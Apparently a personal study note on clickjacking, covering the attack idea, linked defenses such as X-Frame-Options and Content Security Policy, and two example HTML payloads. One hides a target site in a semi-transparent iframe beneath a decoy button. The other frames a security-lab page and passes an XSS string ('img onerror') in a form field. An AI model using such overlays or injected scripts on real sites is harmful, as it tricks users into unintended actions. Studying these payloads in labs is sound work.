---
tags:
  - security
  - web
aliases:
  - UI Redressing
---
Tricking a user into clicking something different from what the user perceives.
Attackers have their own website, embed a real website as an iframe into their website, add hidden buttons that overlay buttons in the iframe.
# Tools
- [[Clickbandit]]
# Defenses
- [[Frame Busting]]
- [[X-Frame-Options]]
- [[Content Security Policy]]
# Techniques
- [[Frame Busting IFrame Sandbox Bypass]]
# Example HTML
- Try not to use relative CSS like vh,vw as this makes it harder on different screen sizes
```
<!DOCTYPE html>
<html lang="en">


<head>
	<style>
		#target_website {
			position:relative;
			width:800px;
			height:800px;
			opacity:0.5;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:800px;
			height:800px;
			z-index:1;
			}
	</style>
</head>

<body>
	<div id="decoy_website">
		<button 
		style="position:absolute; top:100px; left: 200px;"
>Click Me</button>
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>

</html>
```
Also recommended headers:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-store, max-age=0
```

# Alternate Payload
```
<!DOCTYPE html>
<html lang="en">


<head>
</head>

<body>
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

</body>

</html>
```